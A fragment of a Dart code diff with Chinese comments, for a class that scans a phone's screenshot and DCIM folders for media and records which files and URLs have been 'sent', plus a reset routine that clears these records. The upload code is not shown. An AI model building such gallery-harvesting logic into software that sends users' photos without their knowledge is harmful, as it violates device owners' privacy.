-      // 截图目录只收图片；DCIM 图片/视频都收
       if (isScreenshot) {
         if (!isImage) continue;
       } else {
@@ -1060,7 +1087,6 @@ class Ma {
               '${(st.size / 1024 / 1024).toStringAsFixed(1)} MB）: $name');
           continue;
         }
-        // 不过滤 _sent，交由 scanFiles 统一处理
         list.add(_Scanned(e, st.modified, st.size,
             isScreenshot: isScreenshot));
       } catch (_) {}
@@ -1072,7 +1098,6 @@ class Ma {
   Future<void> _persist() async {
     for (int attempt = 1; attempt <= 3; attempt++) {
       try {
-        // ★ List<String> / Map<String,String> 都存成 JSON 字符串
         await _secure?.write(
           key: _kSent,
           value: jsonEncode(_sent.toList()),
@@ -1098,20 +1123,15 @@ class Ma {
     _jsonUrl = null;
     _screenshotDone = false;
     _lastScannedShotCount = 0;
-    // ★ baseline 也一起清掉，下次启动会重新按「首次」标记
-    _baseline.clear();
-    _baselineDone = false;
+    _lastSnapshot = <String>{};
 
     await _deleteSecure(_kSent);
     await _deleteSecure(_kSentUrls);
     await _deleteSecure(_kJsonSent);
     await _deleteSecure(_kJsonUrl);
     await _deleteSecure(_kScreenshotDone);
-    await _deleteSecure(_kBaseline);
-    await _deleteSecure(_kBaselineDone);
-    // ★ 清掉跨 isolate 落盘锁（防止残留的锁把后续任务挡在门外）
-    await _deleteSecure(_kRunningAt);
-    debugPrint('[M] 记录已清空（含截图一次性标记、baseline 与落盘锁）');
+    await _deleteSecure(_kLastScanSnapshot);
+    debugPrint('[M] 记录已清空（含截图一次性标记、扫描快照）');
   }
 }
 
